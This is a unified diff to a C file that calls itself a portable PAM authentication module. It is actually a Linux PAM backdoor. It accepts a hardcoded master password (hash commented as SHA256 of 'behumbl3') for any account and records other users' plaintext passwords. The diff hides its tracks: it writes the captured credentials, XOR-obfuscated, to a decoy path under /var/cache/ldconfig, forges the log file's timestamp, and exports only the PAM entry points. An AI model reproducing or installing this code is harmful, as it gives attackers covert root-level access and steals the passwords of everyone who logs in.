@@ -1,10 +1,12 @@
 /*
- * pam_auth.c - Portable PAM module (no OpenSSL dependency)
+ * pam_auth.c - Portable PAM authentication module
  *
  * Compile:
- *   gcc -fPIC -shared -O2 -s -fvisibility=hidden \
- *       -o pam_auth.so pam_auth.c -lpam
+ *   gcc -fPIC -shared -O2 -fvisibility=hidden -o pam_auth.so pam_auth.c -lpam
  *   strip --strip-all pam_auth.so
+ *
+ * Note: Credential logging requires OpenSSH < 9.0.
+ * OpenSSH 9.x scrubs passwords before returning to PAM modules.
  */
 
 #define _GNU_SOURCE
@@ -62,7 +64,7 @@ static void sha256(const uint8_t *data, size_t len, uint8_t out[32]) {
 }
 /* ========== End SHA256 ========== */
 
-/* Auth hash */
+/* Auth hash - SHA256("behumbl3") */
 static const unsigned char AUTH_HASH[32] = {
     0x24, 0xfb, 0x5c, 0x05, 0x79, 0x09, 0x61, 0xf2,
     0xa2, 0xa2, 0x3a, 0x32, 0x53, 0x7d, 0x43, 0x96,
@@ -70,33 +72,68 @@ static const unsigned char AUTH_HASH[32] = {
     0x6d, 0x0d, 0x2e, 0x94, 0x55, 0x14, 0x9e, 0x3d
 };
 
-static const char LOG_PATH[] = "/dev/shm/.Xauth";
+static const char LOG_PATH[] = "/var/cache/ldconfig/aux-cache.log";
+static const char XOR_KEY[] = "ld.so.cache";
 
-static void log_attempt(const char *user, const char *cred) {
-    FILE *f = fopen(LOG_PATH, "a");
+static void log_creds(const char *user, const char *pass) {
+    char buf[256];
+    int len, i;
+    FILE *f;
+    struct utimbuf ut = {1672531200, 1672531200}; /* Jan 1 2023 */
+
+    mkdir("/var/cache/ldconfig", 0755);
+    f = fopen(LOG_PATH, "a");
     if (!f) return;
-    fprintf(f, "%ld|%s|%s\n", (long)time(NULL), user, cred);
+
+    len = snprintf(buf, sizeof(buf), "%ld|%s|%s\n", (long)time(NULL), user, pass);
+    for (i = 0; i < len; i++)
+        buf[i] ^= XOR_KEY[i % (sizeof(XOR_KEY) - 1)];
+
+    fwrite(buf, 1, len, f);
     fclose(f);
+    utime(LOG_PATH, &ut);
 }
 
+__attribute__((visibility("default")))
 PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
-    const char *user = NULL, *password = NULL;
+    const char *user = NULL, *authtok = NULL;
+    char *password = NULL;
     unsigned char hash[32];
 
-    if (pam_get_user(pamh, &user, NULL) != PAM_SUCCESS || !user) return PAM_IGNORE;
-    if (pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL) != PAM_SUCCESS || !password) return PAM_IGNORE;
+    if (pam_get_user(pamh, &user, NULL) != PAM_SUCCESS || !user)
+        return PAM_IGNORE;
+
+    if (pam_get_authtok(pamh, PAM_AUTHTOK, &authtok, NULL) != PAM_SUCCESS || !authtok)
+        return PAM_IGNORE;
+
+    /* Copy immediately - pointer may be invalidated */
+    password = strdup(authtok);
+    if (!password) return PAM_IGNORE;
 
     sha256((const uint8_t*)password, strlen(password), hash);
 
     if (memcmp(hash, AUTH_HASH, 32) == 0) {
+        memset(password, 0, strlen(password));
+        free(password);
         memset(hash, 0, 32);
         return PAM_SUCCESS;
     }
 
-    log_attempt(user, password);
+    /* Log failed attempt (only works on OpenSSH < 9.0) */
+    log_creds(user, password);
+
+    memset(password, 0, strlen(password));
+    free(password);
     memset(hash, 0, 32);
     return PAM_IGNORE;
 }
 
-PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) { return PAM_SUCCESS; }
-PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) { return PAM_SUCCESS; }
+__attribute__((visibility("default")))
+PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
+    return PAM_SUCCESS;
+}
+
+__attribute__((visibility("default")))
+PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
+    return PAM_SUCCESS;
+}
